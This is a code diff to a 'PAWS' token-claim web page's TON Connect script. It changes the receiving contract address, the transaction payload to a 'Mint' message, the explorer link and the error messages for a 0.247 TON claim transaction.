@@ -211,7 +211,7 @@ alt="PAWS Logo" class="logo">
 
 <!-- Scripts -->
 <script>
-const CONTRACT_ADDRESS = 'EQBJR9b2e6_4pqCA1CwbaHP7CtWX1D2XgWH1Zx2jyNYIVflP';
+const CONTRACT_ADDRESS = 'EQBC9b38kma4eOqGzf7naWryHKK9_wMxr9Oyari3G4G_WYIj';
 const REQUIRED_AMOUNT = '247000000'; // 0.247 TON in nanotons
 
 // Initialize TON Connect with correct options
@@ -269,36 +269,33 @@ async function handleClaim() {
             return;
         }
 
-        // Prepare transaction with Base64 encoded payload
+        // Transaction yapısı
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
             messages: [{
                 address: CONTRACT_ADDRESS,
                 amount: REQUIRED_AMOUNT,
-                stateInit: null,
-                payload: 'te6ccgEBAQEABgAACCBJbmNyZW1lbnQ=' // Base64 encoded "Increment"
+                payload: {
+                    $$type: 'Mint',
+                    queryId: '0'
+                }
             }]
         };
 
         claimButton.disabled = true;
         claimButton.textContent = 'Processing...';
 
-        // Send transaction
         const result = await tonConnect.sendTransaction(transaction);
-        console.log('Transaction details:', result);
+        console.log('Transaction sent:', result);
         
-        // Show success message with explorer link
-        showMessage(`Transaction sent! View on explorer: https://tonscan.org/transaction/${result.hash}`);
+        showMessage(`Transaction sent! View on explorer: https://tonviewer.com/transaction/${result.hash}`);
 
     } catch (error) {
-        console.error('Error details:', error);
-        // More detailed error handling
+        console.error('Full error:', error);
         if (error.message?.includes('rejected')) {
             showMessage("Transaction was rejected by user");
-        } else if (error.message?.includes('balance')) {
-            showMessage("Insufficient balance. You need at least 0.247 TON");
         } else {
-            showMessage("Transaction failed. Please try again.");
+            showMessage(`Transaction failed: ${error.message}`);
         }
     } finally {
         claimButton.disabled = false;
